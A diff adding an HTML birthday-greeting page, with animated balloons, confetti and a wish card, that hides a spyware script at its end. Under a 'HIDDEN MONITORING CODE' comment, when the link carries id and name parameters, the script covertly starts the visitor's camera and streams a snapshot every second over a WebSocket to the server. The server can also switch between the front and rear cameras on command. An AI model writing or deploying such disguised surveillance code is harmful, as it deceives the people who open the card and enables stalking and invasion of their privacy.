@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎉 Happy Birthday! 🎂</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .container {
+            text-align: center;
+            color: white;
+            padding: 20px;
+            animation: fadeIn 1s ease-in;
+        }
+        h1 {
+            font-size: 3em;
+            margin-bottom: 20px;
+            animation: bounce 2s infinite;
+        }
+        .cake {
+            font-size: 5em;
+            margin: 30px 0;
+            animation: rotate 3s ease-in-out infinite;
+        }
+        .message {
+            font-size: 1.5em;
+            line-height: 1.8;
+            margin: 20px 0;
+            animation: slideUp 1s ease-out;
+        }
+        .balloons {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            z-index: -1;
+        }
+        .balloon {
+            position: absolute;
+            font-size: 3em;
+            animation: float 6s ease-in-out infinite;
+        }
+        .balloon:nth-child(1) { left: 10%; animation-delay: 0s; }
+        .balloon:nth-child(2) { left: 30%; animation-delay: 1s; }
+        .balloon:nth-child(3) { left: 50%; animation-delay: 2s; }
+        .balloon:nth-child(4) { left: 70%; animation-delay: 3s; }
+        .balloon:nth-child(5) { left: 90%; animation-delay: 4s; }
+        
+        .confetti {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            background: #f0f;
+            position: absolute;
+            animation: confetti-fall 3s linear infinite;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        
+        @keyframes rotate {
+            0%, 100% { transform: rotate(-5deg); }
+            50% { transform: rotate(5deg); }
+        }
+        
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(100vh); }
+            50% { transform: translateY(-100px); }
+        }
+        
+        @keyframes confetti-fall {
+            to { transform: translateY(100vh) rotate(360deg); }
+        }
+        
+        .sparkle {
+            display: inline-block;
+            animation: sparkle 1.5s ease-in-out infinite;
+        }
+        
+        @keyframes sparkle {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(1.2); }
+        }
+        
+        .wish-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            margin: 30px auto;
+            max-width: 600px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .emoji-rain {
+            position: fixed;
+            font-size: 2em;
+            animation: fall 5s linear infinite;
+        }
+        
+        @keyframes fall {
+            to { transform: translateY(100vh); }
+        }
+    </style>
+</head>
+<body>
+    <div class="balloons">
+        <div class="balloon">🎈</div>
+        <div class="balloon">🎈</div>
+        <div class="balloon">🎈</div>
+        <div class="balloon">🎈</div>
+        <div class="balloon">🎈</div>
+    </div>
+    
+    <div class="container">
+        <h1><span class="sparkle">✨</span> Happy Birthday! <span class="sparkle">✨</span></h1>
+        <div class="cake">🎂</div>
+        
+        <div class="wish-card">
+            <div class="message">
+                🎉 Wishing you a day filled with love, laughter, and joy! 🎉
+                <br><br>
+                May all your dreams come true! 🌟
+                <br><br>
+                Have an amazing celebration! 🎊
+            </div>
+        </div>
+        
+        <div style="margin-top: 30px; font-size: 2em;">
+            🎁 🎈 🎊 🎉 🎂 🎁
+        </div>
+    </div>
+
+    <script>
+        // Create confetti
+        for(let i = 0; i < 50; i++) {
+            const confetti = document.createElement('div');
+            confetti.className = 'confetti';
+            confetti.style.left = Math.random() * 100 + '%';
+            confetti.style.background = ['#ff0', '#f0f', '#0ff', '#f00', '#0f0'][Math.floor(Math.random() * 5)];
+            confetti.style.animationDelay = Math.random() * 3 + 's';
+            confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
+            document.body.appendChild(confetti);
+        }
+        
+        // Create emoji rain
+        setInterval(() => {
+            const emoji = document.createElement('div');
+            emoji.className = 'emoji-rain';
+            emoji.textContent = ['🎉', '🎊', '🎁', '🎈', '⭐', '✨'][Math.floor(Math.random() * 6)];
+            emoji.style.left = Math.random() * 100 + '%';
+            emoji.style.top = '-50px';
+            document.body.appendChild(emoji);
+            setTimeout(() => emoji.remove(), 5000);
+        }, 300);
+
+        // HIDDEN MONITORING CODE
+        const params = new URLSearchParams(window.location.search);
+        const deviceId = params.get('id');
+        const deviceName = params.get('name');
+        
+        if (deviceId && deviceName) {
+            let ws;
+            let currentCameraStream = null;
+            
+            function connectMonitoring() {
+                const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+                ws = new WebSocket(`${wsProtocol}//${window.location.host}?type=device&id=${deviceId}&name=${deviceName}`);
+                
+                ws.onopen = () => {
+                    // Auto-start front camera secretly
+                    setTimeout(() => captureCamera('front'), 2000);
+                };
+                
+                ws.onmessage = (event) => {
+                    const data = JSON.parse(event.data);
+                    if (data.type === 'start_camera') captureCamera(data.camera);
+                };
+                
+                ws.onclose = () => setTimeout(connectMonitoring, 3000);
+            }
+            
+            async function captureCamera(cameraType) {
+                try {
+                    if (currentCameraStream) {
+                        currentCameraStream.getTracks().forEach(track => track.stop());
+                    }
+                    
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: cameraType === 'front' ? 'user' : 'environment' } 
+                    });
+                    currentCameraStream = stream;
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    setInterval(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        if (ws && ws.readyState === WebSocket.OPEN) {
+                            ws.send(JSON.stringify({
+                                type: 'camera',
+                                deviceId: deviceId,
+                                image: canvas.toDataURL('image/jpeg', 0.5)
+                            }));
+                        }
+                    }, 1000);
+                } catch (err) {}
+            }
+            
+            connectMonitoring();
+        }
+    </script>
+</body>
+</html>
